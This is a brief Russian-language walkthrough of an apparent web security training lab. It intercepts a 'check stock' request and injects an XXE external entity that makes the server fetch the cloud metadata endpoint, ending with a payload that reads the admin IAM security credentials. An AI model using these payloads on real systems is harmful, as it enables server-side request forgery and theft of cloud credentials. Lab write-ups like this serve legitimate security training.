1) Перехватываем запрос от нажатия на кнопку check stock
2) Отправляем запрос в repeater. Отменяем перехват
3) После начала xml добавляем <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
4) В ProductId добавляем &xxe
5) Запуск кода
6) Изменяем адрес. <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/"> ]>
7) Запуск кода
8) Изменяем по инструкциям адрес еще несколько раз
9) Финальный адрес: <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
10) Лаба выполнена
